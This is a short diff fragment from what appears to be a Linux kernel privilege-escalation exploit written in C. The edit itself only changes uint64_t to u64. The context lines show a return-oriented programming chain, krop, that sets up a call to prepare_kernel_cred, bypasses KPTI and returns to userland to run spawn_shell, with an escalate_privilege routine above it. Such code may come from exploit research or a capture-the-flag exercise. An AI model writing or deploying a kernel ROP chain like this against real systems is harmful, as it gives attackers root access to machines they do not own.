@@ -66,7 +66,7 @@ void escalate_privilege(void) {
     restore_state();
 }
 
-void krop(uint64_t *ptr) {
+void krop(u64 *ptr) {
     *ptr++ = pop_rdi_ret;
     *ptr++ = 0;
     *ptr++ = addr_prepare_kernel_cred;
@@ -77,7 +77,7 @@ void krop(uint64_t *ptr) {
     *ptr++ = bypass_kpti;
     *ptr++ = 0xdeadbeef;
     *ptr++ = 0xcafebabe;
-    *ptr++ = (uint64_t)&spawn_shell;
+    *ptr++ = (u64)&spawn_shell;
     *ptr++ = user_cs;
     *ptr++ = user_rflags;
     *ptr++ = user_rsp;
